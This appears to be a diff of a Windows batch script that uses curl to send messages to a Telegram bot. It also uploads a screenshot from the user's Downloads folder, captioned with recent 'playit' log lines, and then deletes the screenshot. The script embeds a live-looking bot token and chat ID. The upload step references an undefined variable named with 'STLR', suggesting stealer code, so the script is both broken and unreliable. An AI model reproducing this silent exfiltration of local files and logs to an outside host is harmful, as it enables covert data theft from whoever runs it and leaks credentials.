@@ -1,11 +1,23 @@
 @echo off
 
 
-:: Set your bot token and chat ID
-set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID=-4765575800"
-:: Path to your photo
-set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+:: ============ MyScreen TOPIC ============
+
+
+:: Set bot token, chat ID, and message
+set "TOKEN_MyScrn=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_MyScrn=-1002163721260"
+set "TOPIC_ID_MyScrn=74293"
+set "MESSAGE_MyScrn=Left......|%time%|"
+set "ENCODED_MESSAGE_MyScrn=%MESSAGE_MyScrn: =%%2"
+set "CAPTION_MyScrn="
+set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
+
+
+
 
 
 
@@ -73,12 +85,32 @@ echo 1 > "%temp%\run_once1.flag"
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
 :skip_code
 
 
 
+:: Send Message 
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_MyScrn%" ^
+     -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
+     -d "text=Waiting30Sec"
 
-timeout /t 840 /nobreak
+
+
+timeout /t 30 /nobreak
 
 
 :again
@@ -102,16 +134,26 @@ echo Last 7 lines have been saved to %output_file%
 
 
 :: Use PowerShell to read the contents of playit_7lines.log and URL-encode it
-for /f "delims=" %%a in ('powershell -Command "(Get-Content '%output_file%' | Out-String).Trim() -replace ' ', '%%20' -replace '&', '%%26' -replace '\n', '%%0A'"') do set "ENCODED_MESSAGE=%%a"
+for /f "delims=" %%a in ('powershell -Command "(Get-Content '%output_file%' | Out-String).Trim() -replace ' ', '%%20' -replace '&', '%%26' -replace '\n', '%%0A'"') do set "CAPTION_MyScrn=%%a"
 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
-     -F "chat_id=%CHAT_ID%" ^
-     -F "photo=@%PHOTO_PATH%"
 
-:: Send the message using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
-     -d "chat_id=%CHAT_ID%" ^
-     -d "text=%ENCODED_MESSAGE%"
+:: Send Message 
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_MyScrn%" ^
+     -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
+     -d "text=Sending Now!"
+
+
+:: Send the file (as a document)
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
+     -F "chat_id=%CHAT_ID_MyScrn%" ^
+     -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
+     -F "caption=%CAPTION_MyScrn%" ^
+     -F "document=@%FILE_PATH_STLR%"
+
+
+
+
 
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
